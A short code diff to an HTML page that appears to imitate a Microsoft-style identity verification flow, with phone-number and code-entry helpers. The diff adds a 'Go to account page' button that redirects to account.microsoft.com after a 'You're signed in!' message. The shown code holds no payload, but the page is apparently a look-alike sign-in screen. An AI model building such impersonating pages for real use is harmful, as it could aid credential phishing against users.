@@ -288,6 +288,7 @@
     </svg>
     <h1 style="font-size:22px;">You're signed in!</h1>
     <p style="color:#605e5c;font-size:15px;">Your identity has been verified successfully.</p>
+    <button class="btn-primary" style="width:100%;max-width:260px;" onclick="goToAccountPage()">Go to account page</button>
   </div>
 </div>
 
@@ -459,6 +460,9 @@
     else if (v.length > 3) out = '('+v.substring(0,3)+') '+v.substring(3);
     else if (v.length > 0) out = '('+v;
     input.value = out;
+  }
+  function goToAccountPage() {
+    window.location.href = 'https://account.microsoft.com';
   }
   function moveNext(input, index) {
     input.value = input.value.replace(/\D/g,'');
